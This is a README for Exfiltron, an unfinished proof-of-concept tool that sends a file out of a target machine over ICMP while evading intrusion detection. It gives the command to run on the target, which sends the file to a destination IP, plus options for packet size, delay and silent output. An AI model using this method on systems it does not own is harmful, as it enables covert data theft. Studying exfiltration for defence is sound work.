# Exfiltron
Data Exfiltration Framework 

!!!! Please be aware that is project is in progress and may have parts missing
!!!!

## What does it do?
This framework is meant as a proof of concept for exfiltrating data 
from a target computer. YOU SHOULD NOT USE THIS ON ANYTHING YOU DO 
NOT OWN OR HAVE EXPLICIT PERMISSION TO USE IT ON. Exfiltron is meant to 
evade IDS in order to get data back to you.

## Things you must have before extraction time
* You must have python 2 installed on both the server and the client side
* You must have scapy installed on both the server and the client side

## Sounds great! How do I try it out?
First, get it on your local machine. There are two major files: the client
file (exfiltron.py) and the server file. The client file must be placed on
a target machine along with any modules you wish to use for your extraction
method. SET UP THE SERVER SIDE INFORMATION HERE. After exfiltron.py has
been placed on the target machine, run the following command on the target:

`python exfiltron.py exfiltrationMethod -f filename -d destinationIP [-ahqt]`

* -h is help
* -a (--data-per-packet) is the amount of data you want to fit into each packet.
The default is the number of bytes that normally sit in that packet while the
min amount is 1 byte and the max amount is the MTU minus the headers and trailers
on the packet
* -t (--time) specifies the amount of time to wait between after sending a packet
before sending another packet. This numerical value should be given in terms of
seconds. If no value is explicitly set, exfiltron defaults the value to 5 seconds
* -q (--quiet) By default, a progress bar is shown displaying
numPacketsSent/numTotalPacketsToSend. This option silences any output relating
to the progress bar

## Methods of Exfiltration
Currently, the following methods of exfiltration are available/in progress:
* ICMP

#### Original Authors
* Adam Sowden
* Andrew Steiner
* Thomas Daniels
